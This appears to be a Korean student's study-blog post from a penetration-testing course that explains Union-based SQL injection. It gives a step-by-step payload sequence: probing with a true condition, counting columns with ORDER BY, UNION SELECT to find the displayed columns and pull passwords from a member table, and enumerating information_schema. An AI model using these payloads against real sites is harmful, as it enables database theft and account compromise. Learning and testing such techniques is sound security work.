---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[WEB HACKING] Union SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 6주차"

date: 2024-11-20
last_modified_at: 2024-12-21

tags: [TIL, WEB, DATABASE, SECURITY]
---

# Union SQL Injection
## Union SQL Injection이란?
: 웹페이지에 데이터가 나오는 경우에서 데이터를 추출하는 방법
union
join은 안되냐??

## Union SQL Injection 공격 Point
1. DB를 사용하는 곳
2. 그 데이터가 화면에 나오는 rht
    1. 게시판
    2. 로그인, 아이디 중복체크 등

## ORDER BY
출력되는 데이터 정렬할 때 사용
`SELECT ~ ORDER BY [COLUMN]`

## UNION SQL INJECTION Process
1. sql injection 포인트 찾기  
`' and '1' = '1`
2. column 개수 찾기  
`' order by 1...n #`
3. 출력되는 column 위치 찾기  
`' union select 1, 2, 3, 4 #`  
-> select 1, 2, 3, 4가 왜 정상적으로 작동하는 거야???  
-> `' union select 1, pass, 3, 4 from member #`  
4. db 이름 확인  
`select database()`  
-> `' union select 1, database(), 3, 4 from member #`
5. table 이름 확인  
`select table_name from information_schema.tables where table_schema = [DB 이름]`  
-> `' union select 1, table_name, 3, 4 from information_schema.tables where table_schema = [DB 이름] #`
6. column 이름 확인  
`select column_name from information_schema.columns where table_name = [table 이름]`  
-> `' union select 1, column_name, 3, 4 from information_schema.columns where table_name = [table 이름] #`
7. data 추출

클라이언트 측 인증

분리
내가 비밀번호를 바꿀 수 있던지
비밀번호를 알아내던지

어떤 방식으로 고민을 해야 하는가?
어떻게 동작하느냐? -> 직접 만들어보기
sql query문 직접 실행해보기
왜 됐는 지 확인하기
1. 문제 원인 찾기
2. 문제 해결하기

남들의 문제는 원인을 생각하지 마라

https://www.redirhub.com/ko/blog/redirect-types-and-seo-effects-2
https://developer.mozilla.org/ko/docs/Web/HTTP/Redirections